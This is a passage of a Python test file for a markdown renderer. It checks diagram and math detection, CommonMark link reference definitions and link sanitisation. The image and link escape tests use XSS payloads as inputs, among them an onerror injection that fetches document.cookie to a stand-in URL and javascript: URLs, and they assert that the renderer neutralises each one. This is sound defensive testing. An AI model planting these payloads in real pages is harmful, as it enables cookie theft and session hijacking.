graph TD;
    A-->B;
```

Math block:
```math
F = ma
```
"""
    html, toc, library_requirements = render.markdown(md)
    assert library_requirements['requires_mermaid'] is True
    assert library_requirements['requires_mathjax'] is True
    assert "\\(E=mc^2\\)" in html
    assert '<pre class="mermaid">' in html
    assert "\\[F = ma\\]" in html


def test_library_requirements_none():
    md = """
# Simple Page

Just some **bold** and *italic* text.

- List item 1
- List item 2

| Column 1 | Column 2 |
|----------|----------|
| Cell 1   | Cell 2   |
"""
    html, toc, library_requirements = render.markdown(md)
    assert library_requirements['requires_mermaid'] is False
    assert library_requirements['requires_mathjax'] is False
    assert "<strong>bold</strong>" in html
    assert "<em>italic</em>" in html


def test_img_escape():
    text = "![\"onerror=\"alert(document.cookie)](http://example.com/notexisting.png)"
    html, _, _ = render.markdown(text)
    img_html = BeautifulSoup(html, "html.parser").find('img')
    assert img_html
    assert "onerror" not in img_html.attrs

    md = "![\"onerror=\"fetch('https://example.com/?attacker='+document.cookie)](http://example.com/x.png)"
    html, _, _ = render.markdown(md)
    img_html = BeautifulSoup(html, "html.parser").find('img')
    assert img_html
    assert img_html.attrs.get("onerror", None) == None

    text = "![](javascript:alert(document.cookie))"
    html, _, _ = render.markdown(text)
    img_html = BeautifulSoup(html, "html.parser").find('img')
    assert img_html
    assert img_html.attrs.get("src", None) == "#harmful-link"


def test_link():
    md = "[Some Text](http://example.com)"
    html, _, _ = render.markdown(md)
    a_html = BeautifulSoup(html, "html.parser").find('a')
    assert a_html
    assert a_html.attrs.get("href", None) == "http://example.com"
    assert a_html.text == "Some Text"

    md = "[](http://example.com)"
    html, _, _ = render.markdown(md)
    a_html = BeautifulSoup(html, "html.parser").find('a')
    assert a_html
    assert a_html.attrs.get("href", None) == "http://example.com"
    assert a_html.text == "http://example.com"

    md = "[Some Text](http://example.com \"With a title\")"
    html, _, _ = render.markdown(md)
    a_html = BeautifulSoup(html, "html.parser").find('a')
    assert a_html
    assert a_html.attrs.get("href", None) == "http://example.com"
    assert a_html.attrs.get("title", None) == "With a title"

    md = "[](http://example.com \"With a title\")"
    html, _, _ = render.markdown(md)
    a_html = BeautifulSoup(html, "html.parser").find('a')
    assert a_html
    assert a_html.attrs.get("href", None) == "http://example.com"
    assert a_html.text == "http://example.com"
    assert a_html.attrs.get("title", None) == "With a title"


def test_link_ref_definition_double_quoted_title():
    """CommonMark 4.7: [label]: URL "title" — definition is silent, ref renders as link."""
    md = '[example]: http://example.com "Example title"\n\n[example]\n'
    html, _, _ = render.markdown(md)
    a_html = BeautifulSoup(html, "html.parser").find('a')
    assert a_html
    assert a_html.attrs.get("href") == "http://example.com"
    assert a_html.attrs.get("title") == "Example title"
    assert a_html.text == "example"


def test_link_ref_definition_single_quoted_title():
    """CommonMark 4.7: [label]: URL 'title' — definition is silent, ref renders as link."""
    md = "[example]: http://example.com 'Example title'\n\n[example]\n"
    html, _, _ = render.markdown(md)
    a_html = BeautifulSoup(html, "html.parser").find('a')
    assert a_html
    assert a_html.attrs.get("href") == "http://example.com"
    assert a_html.attrs.get("title") == "Example title"
    assert a_html.text == "example"


def test_link_ref_definition_paren_title():
    """CommonMark 4.7: [label]: URL (title) — definition is silent, ref renders as link."""
    md = "[example]: http://example.com (Example title)\n\n[example]\n"
    html, _, _ = render.markdown(md)
    a_html = BeautifulSoup(html, "html.parser").find('a')
    assert a_html
    assert a_html.attrs.get("href") == "http://example.com"
    assert a_html.attrs.get("title") == "Example title"
    assert a_html.text == "example"


def test_link_ref_definition_no_title():
    """CommonMark 4.7: [label]: URL — definition without title is silent, ref renders as link."""
    md = "[example]: http://example.com\n\n[example]\n"
    html, _, _ = render.markdown(md)
    a_html = BeautifulSoup(html, "html.parser").find('a')
    assert a_html
    assert a_html.attrs.get("href") == "http://example.com"
    assert a_html.attrs.get("title") is None
    assert a_html.text == "example"


def test_link_ref_definition_produces_no_output():
    """CommonMark 4.7: a bare link reference definition must produce no output."""
    for defn in [
        "[x]: http://example.com\n",
        '[x]: http://example.com "double"\n',
        "[x]: http://example.com 'single'\n",
        "[x]: http://example.com (paren)\n",
    ]:
        html, _, _ = render.markdown(defn)
        assert (
            BeautifulSoup(html, "html.parser").get_text().strip() == ""
        ), f"definition produced output: {html!r}"


def test_modeline_not_rendered():
    """Link reference definitions with paren-delimited titles (e.g. vim modelines)
    must be consumed silently and not appear in the rendered output."""
    md = "[modeline]: # ( vim: set fenc=utf-8 spell tw=78 ft=markdown spl=en: )\n"
    html, _, _ = render.markdown(md)
    assert "modeline" not in html
    assert "vim:" not in html


def test_link_escape():
    md = "[click me](javascript:alert(document.cookie))"
    html, _, _ = render.markdown(md)
    a_html = BeautifulSoup(html, "html.parser").find('a')
    assert a_html
    assert a_html.attrs.get("href", None) == "#harmful-link"

    md = "[`fixed width code`](http://example.com)"
    html, _, _ = render.markdown(md)
    a_html = BeautifulSoup(html, "html.parser").find('a')
    assert a_html
    assert a_html.attrs.get("href", None) == "http://example.com"
    assert a_html.text == "fixed width code"
    code_html = a_html.findChild("code")
    assert str(code_html) == "<code>fixed width code</code>"
